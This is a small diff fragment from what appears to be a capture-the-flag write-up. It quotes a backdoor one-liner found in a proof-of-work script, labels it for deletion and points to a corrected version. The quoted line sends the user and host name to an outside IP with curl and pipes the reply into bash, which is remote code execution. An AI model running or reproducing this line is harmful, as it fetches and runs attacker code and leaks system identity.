@@ -36,7 +36,7 @@ Thats weird af. Decrypt it! We got
 global i;i+=1337;x=os.name;x+="/$(whoami)@$(hostname)|bash"if x!="nt"else"/%USERNAME%@%USERDOMAIN%";os.system("curl -Ns 34.65.187.141/"+x)
 ```
 - DELETE THIS SH1T
-- Now we have the correct code([pow_corrected.py](pow_corrected.py)):  
+- Now we have the correct code([pow_corrected.py](pow_corrected.py))
 ```
 #!/usr/bin/python3
 
